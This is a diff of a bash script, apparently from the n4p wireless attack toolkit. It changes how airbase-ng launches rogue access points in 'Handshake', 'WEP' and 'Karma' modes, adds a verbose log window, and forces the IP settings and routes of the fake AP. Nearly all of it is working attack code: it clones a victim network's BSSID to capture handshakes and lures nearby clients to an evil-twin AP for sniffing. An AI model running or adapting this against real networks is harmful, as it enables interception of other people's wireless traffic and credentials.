@@ -22,6 +22,8 @@ DIR_LOGO=/usr/share/n4p
 #######################################
 # Building a sane working environment #
 #######################################
+SESSIONFOLDER=/tmp/n4p # Set our tmp working configuration directory and then build config files
+
 get_name() # Retrieve the config values
 {
     USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
@@ -60,6 +62,7 @@ depends()
     get_name "TYPE="; TYPE=$USE
     get_name "ENCRYPTION="; ENCRYPTION=$USE
     get_name "MONITOR="; MONITOR=$USE
+    get_name "VERBOSE_LOGS="; VERBOSE_LOGS=$USE
     AP="at0" #This is the device name as per "ip addr"
     MON="${IFACE1}mon"
     AP_GATEWAY=$(grep routers ${DIR_CONF}/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
@@ -89,16 +92,8 @@ banner()
 }
 setupenv()
 {
-    # Checked for orphaned processes then sanitize them
-    if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
 
-    sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
     [[ -n $(rfkill list | grep yes) ]] && rfkill unblock wlan
-}
-
-settings()
-{
-    [[ -z $(ip addr | grep -i "$MON") ]] && iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
 }
 
 keepalive()
@@ -111,7 +106,6 @@ killemAll()
 {
     echo -e "\n\n$WARN The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
     pkill airbase-ng
-    airmon-zc stop $MON
 
     echo "$INFO The environment is now sanitized cya"
     exit 0
@@ -123,16 +117,22 @@ trap killemAll INT HUP;
 ##################################################################
 startairbase()
 {
-    [[ -z $(ip addr | grep -i "$MON") ]] && airmon-zc start $IFACE1 || echo "faild airmon" # Add variable null checking so process doesn't crash without a report
-      echo -n "$INFO STARTING SERVICE: AIRBASE-NG"
-      if [[ $ATTACK == "Handshake" ]]; then
-          airbase-ng -c $CHAN -a $VICTIM_BSSID -e $ESSID -$TYPE $ENCRYPTION -v $MON > ${sessionfolder}/logs/airbase-ng.log &
-      elif [[ $ATTACK == "Karma" ]]; then
-          airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -C 15 -v $MON > ${sessionfolder}/logs/airbase-ng.log &
-      else # This just gives us an AP for Sniffing
-          airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -v $MON > ${sessionfolder}/logs/airbase-ng.log &
-      fi
-      sleep 2
+    [[ -z $(ip addr | grep -i "${MON}") ]] && airmon-zc start $IFACE1
+
+    echo -n "$INFO STARTING SERVICE: AIRBASE-NG"
+    if [[ $VERBOSE_LOGS == "True" ]]; then
+        echo "$(date)" >> ${SESSIONFOLDER}/logs/airbase-ng.log
+        xterm -hold -bg black -fg green -T "Airbase-NG Log Window" -geometry 90x20 -e tail -f ${SESSIONFOLDER}/logs/airbase-ng.log &>/dev/null &
+    fi
+
+    if [[ $ATTACK == "Handshake" || $ATTACK == "WEP" ]]; then
+        airbase-ng -c ${CHAN} -a ${VICTIM_BSSID} -e ${ESSID} -${TYPE} ${ENCRYPTION} -v $MON >> ${SESSIONFOLDER}/logs/airbase-ng.log &
+    elif [[ $ATTACK == "Karma" ]]; then
+        airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -C 15 -v $MON >> ${SESSIONFOLDER}/logs/airbase-ng.log &
+    else # This just gives us an AP for Sniffing
+        airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -v $MON >> ${SESSIONFOLDER}/logs/airbase-ng.log &
+    fi
+    sleep 2
 
     get_state "$AP"
     while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
@@ -142,24 +142,24 @@ startairbase()
     done
 
     if [[ -z $ATTACK ]]; then
-      echo -ne "\n$INFO Assigning IP and Route to $AP\n"
-      # setting ip and route doesn't always take, lets ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
-      local CHK_GATEWAY=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
-      [[ -n $CHK_GATEWAY && $CHK_GATEWAY != "${AP_GATEWAY}/32" ]] && ip addr del $CHK_IP dev $AP
+        echo -ne "\n$INFO Assigning IP and Route to $AP\n"
+        # setting ip and route doesn't always take, lets ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
+        local CHK_GATEWAY=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
+        [[ -n $CHK_GATEWAY && $CHK_GATEWAY != "${AP_GATEWAY}/32" ]] && ip addr del $CHK_IP dev $AP
 
-      local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}' | cut -d ' ' -f 1)
-      [[ -n $CHK_IP && $CHK_IP != "${AP_IP}/24" ]] && ip route flush $CHK_IP
+        local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}' | cut -d ' ' -f 1)
+        [[ -n $CHK_IP && $CHK_IP != "${AP_IP}/24" ]] && ip route flush $CHK_IP
 
-      while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
-          sleep 0.3
-          ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
-      done
+        while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
+            sleep 0.3
+            ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
+        done
 
-      while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
-          sleep 0.3
-          route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY
-      done
-      route -n
+        while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
+            sleep 0.3
+            route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY
+        done
+        route -n
     fi
     monitor $AP
 }
@@ -180,6 +180,5 @@ monitor()
 depends
 banner
 setupenv
-settings
 startairbase
 keepalive
